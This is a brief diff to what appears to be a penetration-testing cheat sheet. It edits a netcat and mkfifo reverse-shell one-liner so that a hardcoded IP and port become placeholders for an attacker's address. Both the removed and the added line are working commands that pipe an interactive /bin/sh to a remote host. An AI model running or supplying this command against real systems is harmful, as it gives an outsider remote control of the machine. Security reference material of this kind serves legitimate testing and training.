@@ -168,7 +168,7 @@ php(file)
 for some special cases 
 
 ```shell
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> <attacker port> >/tmp/f
 ```
 
 ### :open_file_folder: Cron jobs
